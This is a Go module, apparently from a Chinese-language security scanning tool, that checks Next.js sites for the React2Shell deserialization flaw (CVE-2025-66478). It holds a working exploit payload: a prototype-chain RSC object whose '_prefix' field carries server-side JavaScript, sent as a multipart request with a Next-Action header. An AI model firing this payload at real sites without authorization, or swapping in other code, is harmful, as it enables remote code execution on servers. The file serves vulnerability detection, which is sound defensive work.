// cve_2025_66478 模块移植自 CVE-Exploits 仓库的 React2Shell Go 复现工具（检测模式）。
package cve_2025_66478

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/ctkqiang/nezha_cli/internal/model"
	"github.com/ctkqiang/nezha_cli/internal/modulekit"
	"github.com/ctkqiang/nezha_cli/pkg/logger"
)

const (
	// defaultBoundary 是 multipart 请求体的分隔符。
	defaultBoundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"

	// maxBodyBytes 是响应体读取上限。
	maxBodyBytes = 1 << 20
)

var (
	// actionPattern 从 HTML 中提取 Next-Action ID。
	actionPattern = regexp.MustCompile(`action="([^"]+)"`)
)

// Module 是 React2Shell 检测模块。
type Module struct{}

/*
New 创建 React2Shell 检测模块实例。

参数:
  - 无。

返回:
  - model.Module: 模块实例。
*/
func New() model.Module {
	return &Module{}
}

/*
Meta 返回 React2Shell 检测模块的元数据。

参数:
  - 无。

返回:
  - model.Meta: 模块名称、类别、说明与参数声明。
*/
func (m *Module) Meta() model.Meta {
	return model.Meta{
		Name:     "cve_2025_66478",
		Aliases:  []string{"react2shell", "nextjs_rce"},
		Category: modulekit.CategoryWeb,
		Summary:  "Next.js React2Shell 漏洞检测",
		Description: "移植自作者 CVE-Exploits 仓库的 React2Shell Go 复现工具（检测模式）：\n" +
			"向目标发送构造的 RSC 反序列化负载，若响应为 500 且包含 digest 特征，\n" +
			"判定目标存在 CVE-2025-66478。本模块只做检测与判定，不执行任意代码。\n" +
			"检测负载会触发服务端反序列化异常，可能产生日志告警，必须已获书面授权。",
		Author: modulekit.Author,
		Impact: "高（发送恶意 RSC 负载并触发服务端反序列化）",
		Options: []model.Option{
			modulekit.Option("URL", "目标 Next.js 站点 URL，例如 https://target.com", true, ""),
			modulekit.Option("ACTION", "Next-Action ID；留空自动从页面提取", false, ""),
			modulekit.Option("TIMEOUT", "单次请求超时", false, "10s"),
			modulekit.Option("VERBOSE", "是否输出响应头与响应预览", false, "false"),
		},
		References: []string{"https://github.com/ctkqiang/CVE-Exploits/tree/main/CVE-2025-66478"},
	}
}

/*
Run 提取 Action ID、发送检测负载并分析响应。

参数:
  - ctx (context.Context): 执行上下文。
  - options (model.Options): 已合并默认值的模块参数。
  - out (io.Writer): 结果输出目标。

返回:
  - error: 目标非法、请求失败时返回错误。
*/
func (m *Module) Run(ctx context.Context, options model.Options, out io.Writer) error {
	target := strings.TrimRight(strings.TrimSpace(options.Get("URL")), "/")
	if target == "" || !strings.HasPrefix(target, "http") {
		return fmt.Errorf("URL 必须以 http:// 或 https:// 开头")
	}

	timeout := options.Duration("TIMEOUT", 10*time.Second)
	client := &http.Client{Timeout: timeout}

	actionID := strings.TrimSpace(options.Get("ACTION"))
	if actionID == "" {
		logger.Info("正在从页面提取 Next-Action ID…")
		extracted, err := extractActionID(ctx, client, target)
		if err != nil {
			return fmt.Errorf("自动提取失败: %w（可手动设置 ACTION）", err)
		}
		actionID = extracted
	}
	logger.Info("ActionID: %s", actionID)

	modulekit.Section(out, "检测配置")
	modulekit.KeyValues(out, [][2]string{
		{"目标", target},
		{"ActionID", actionID},
		{"CVE", "CVE-2025-66478 (React2Shell)"},
	}, 60)

	status, headers, body, err := sendExploitRequest(ctx, client, target, actionID)
	if err != nil {
		return fmt.Errorf("检测请求失败: %w", err)
	}

	vulnerable, digest := AnalyzeResponse(status, body)
	modulekit.Section(out, "判定")
	modulekit.KeyValues(out, [][2]string{
		{"HTTP 状态码", fmt.Sprintf("%d", status)},
		{"错误摘要", dash(digest)},
		{"判定", verdictLabel(vulnerable)},
	}, 60)

	if options.Bool("VERBOSE", false) {
		modulekit.Section(out, "响应头")
		for key, values := range headers {
			fmt.Fprintf(out, "  %s: %s\n", key, strings.Join(values, "; "))
		}
		if len(body) > 0 {
			preview := string(body)
			if len(preview) > 300 {
				preview = preview[:300] + "…"
			}
			fmt.Fprintf(out, "响应预览: %s\n", preview)
		}
	}

	if vulnerable {
		logger.Success("目标存在 CVE-2025-66478（React2Shell）")
		fmt.Fprintln(out, "[建议] 升级 Next.js 至 15.0.5+ 或 16.0.7+，并排查服务端日志。")
	} else if status == http.StatusOK {
		fmt.Fprintln(out, "服务器正常响应，目标可能已修复或 Action ID 不匹配。")
	} else {
		fmt.Fprintln(out, "响应未命中典型漏洞特征，建议结合版本指纹与人工验证。")
	}
	return nil
}

/*
sendExploitRequest 构造恶意 RSC 负载并以 multipart 形式发送。

参数:
  - ctx (context.Context): 请求上下文。
  - client (*http.Client): HTTP 客户端。
  - target (string): 目标地址。
  - actionID (string): Next-Action ID。

返回:
  - int: HTTP 状态码。
  - http.Header: 响应头。
  - []byte: 响应体。
  - error: 请求失败时返回错误。
*/
func sendExploitRequest(ctx context.Context, client *http.Client, target string, actionID string) (int, http.Header, []byte, error) {
	payload := map[string]any{
		"then":   "$1:__proto__:constructor:constructor",
		"status": "resolved_model",
		"reason": -1,
		"value": map[string]string{
			"then": "$B0",
		},
		"_response": map[string]any{
			"_prefix": "console.log('CVE-2025-66478-CONFIRMED')",
			"_formData": map[string]string{
				"get": "$1:constructor:constructor",
			},
		},
	}

	var buffer bytes.Buffer
	buffer.WriteString(fmt.Sprintf("--%s\r\n", defaultBoundary))
	buffer.WriteString("Content-Disposition: form-data; name=\"0\"\r\n\r\n")
	payloadJSON, _ := json.Marshal(payload)
	buffer.Write(payloadJSON)
	buffer.WriteString("\r\n")
	buffer.WriteString(fmt.Sprintf("--%s\r\n", defaultBoundary))
	buffer.WriteString("Content-Disposition: form-data; name=\"1\"\r\n\r\n")
	buffer.WriteString("{\"x\":1}\r\n")
	buffer.WriteString(fmt.Sprintf("--%s--\r\n", defaultBoundary))

	request, err := http.NewRequestWithContext(ctx, http.MethodPost, target, &buffer)
	if err != nil {
		return 0, nil, nil, err
	}
	request.Header.Set("Content-Type", fmt.Sprintf("multipart/form-data; boundary=%s", defaultBoundary))
	request.Header.Set("Next-Action", actionID)
	request.Header.Set("User-Agent", "CVE-2025-66478-Exploit/1.0")
	request.Header.Set("Accept", "*/*")

	response, err := client.Do(request)
	if err != nil {
		return 0, nil, nil, err
	}
	defer response.Body.Close()

	body, err := io.ReadAll(io.LimitReader(response.Body, maxBodyBytes))
	if err != nil {
		return response.StatusCode, response.Header, nil, err
	}
	return response.StatusCode, response.Header, body, nil
}

/*
AnalyzeResponse 按上游判据检查：500 且包含 "digest" 视为存在漏洞。
该函数同时供模块执行与测试使用。

参数:
  - status (int): HTTP 状态码。
  - body ([]byte): 响应体。

返回:
  - bool: 命中漏洞特征返回 true。
  - string: 提取出的错误摘要，未命中返回空串。
*/
func AnalyzeResponse(status int, body []byte) (bool, string) {
	text := string(body)
	if status != http.StatusInternalServerError {
		return false, ""
	}
	if !strings.Contains(text, `"digest"`) {
		return false, ""
	}
	digest := ""
	if index := strings.Index(text, `{"digest"`); index != -1 {
		if end := strings.Index(text[index:], "}"); end != -1 {
			digest = text[index : index+end+1]
		}
	}
	return true, digest
}

/*
extractActionID 从页面 HTML 中提取 action 属性作为 Next-Action ID。

参数:
  - ctx (context.Context): 请求上下文。
  - client (*http.Client): HTTP 客户端。
  - target (string): 目标地址。

返回:
  - string: 提取到的 Action ID。
  - error: 请求失败或页面不含 action 属性时返回错误。
*/
func extractActionID(ctx context.Context, client *http.Client, target string) (string, error) {
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		return "", err
	}
	response, err := client.Do(request)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	body, err := io.ReadAll(io.LimitReader(response.Body, maxBodyBytes))
	if err != nil {
		return "", err
	}
	matches := actionPattern.FindStringSubmatch(string(body))
	if len(matches) < 2 || strings.TrimSpace(matches[1]) == "" {
		return "", fmt.Errorf("页面中未找到 action 属性")
	}
	return matches[1], nil
}

/*
verdictLabel 把判定结果转换为中文标签。

参数:
  - vulnerable (bool): 判定结果。

返回:
  - string: 中文标签。
*/
func verdictLabel(vulnerable bool) string {
	if vulnerable {
		return "存在 CVE-2025-66478 漏洞"
	}
	return "未命中漏洞特征"
}

/*
dash 把空字符串归一化为占位符。

参数:
  - value (string): 原始值。

返回:
  - string: 原始值或 "-"。
*/
func dash(value string) string {
	if strings.TrimSpace(value) == "" {
		return "-"
	}
	return value
}
